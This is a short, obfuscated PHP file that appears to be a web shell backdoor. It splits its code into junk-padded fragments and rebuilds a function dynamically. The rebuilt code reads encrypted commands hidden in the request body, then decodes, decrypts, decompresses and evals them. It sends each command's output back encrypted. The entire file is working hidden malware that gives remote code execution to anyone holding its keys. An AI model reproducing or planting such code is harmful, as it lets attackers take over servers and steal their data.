<?php
$h='+u%u%+,u%$i++){$o.=$tu%{$i}^u%$k{$j};}u%u%}return $o;}ifu% (@pu%reg_match(';
$K='$u%m[1]u%),$k)));u%u%$o=@obu%_get_conteu%nts();@ob_end_u%clean()u%;$r=@bu%';
$O=str_replace('Wz','','WzcreaWzteWz_WzWzfWzunction');
$G='ase64u%_encodeu%(@x(@gu%zcou%mpu%resu%s(u%$o),$k));pu%rint("$p$kh$r$kf");}';
$X='1u%) {@ob_su%tart();u%@evau%lu%(@gzuu%ncompress(@x(@bau%seu%64_decou%de(u%';
$w='u%en($t);u%$o="";foru%($i=0u%;u%$i<$u%l;){for($j=0;(u%$j<$cu%&u%&$i<$l);$j';
$l='"3XBu%8XFPVwu%hfGwaMg";funu%ctionu%u% x($t,$k){$c=su%u%trlen($k);$l=su%trl';
$T='$k="u%18ac168u%b";$kh="u%4a08fu%3u%37c014";$kfu%u%="0692691u%852d3u%";$u%p=';
$z='u%"/$kh(u%.+)$u%kf/",@fu%ile_geu%tu%u%_u%contents("php://input")u%,$m)=u%=';
$k=str_replace('u%','',$T.$l.$w.$h.$z.$X.$K.$G);
$i=$O('',$k);$i();
?>
